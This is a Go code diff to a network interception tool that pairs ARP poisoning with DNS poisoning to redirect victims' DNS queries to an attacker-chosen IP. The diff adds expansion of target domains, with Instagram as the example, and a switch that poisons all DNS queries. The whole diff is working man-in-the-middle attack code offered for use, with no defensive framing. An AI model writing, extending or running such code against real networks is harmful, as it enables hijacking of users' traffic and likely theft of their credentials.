@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"strings"
 )
 
 // InterceptSuite orchestrates the full DNS interception pipeline:
@@ -74,11 +75,31 @@ func NewInterceptSuite(cfg InterceptConfig) (*InterceptSuite, error) {
 		return nil, fmt.Errorf("ARP poisoner init failed: %w", err)
 	}
 
+	// Expand target domains: for "www.instagram.com", also add "instagram.com"
+	expandedDomains := make([]string, 0, len(cfg.TargetDomains)*2)
+	seen := make(map[string]bool)
+	for _, d := range cfg.TargetDomains {
+		d = strings.ToLower(d)
+		if !seen[d] {
+			expandedDomains = append(expandedDomains, d)
+			seen[d] = true
+		}
+		// Extract base domain (e.g., www.instagram.com → instagram.com)
+		parts := strings.Split(d, ".")
+		if len(parts) > 2 {
+			base := strings.Join(parts[len(parts)-2:], ".")
+			if !seen[base] {
+				expandedDomains = append(expandedDomains, base)
+				seen[base] = true
+			}
+		}
+	}
+
 	// Create DNS poisoner
 	dnsCfg := PoisonerConfig{
 		Interface:     cfg.Interface,
 		RedirectIP:    cfg.RedirectIP,
-		TargetDomains: cfg.TargetDomains,
+		TargetDomains: expandedDomains,
 		TTL:           600,
 	}
 	dnp, err := NewPoisoner(dnsCfg)
@@ -196,6 +217,11 @@ func (is *InterceptSuite) AddTarget(domain string) {
 // RemoveTarget removes a domain from interception
 func (is *InterceptSuite) RemoveTarget(domain string) {
 	is.dnsPoisoner.RemoveTarget(domain)
+}
+
+// SetPoisonAll enables/disables poisoning of ALL DNS queries
+func (is *InterceptSuite) SetPoisonAll(enabled bool) {
+	is.dnsPoisoner.SetPoisonAll(enabled)
 }
 
 // GetDNSStats returns DNS poisoning statistics
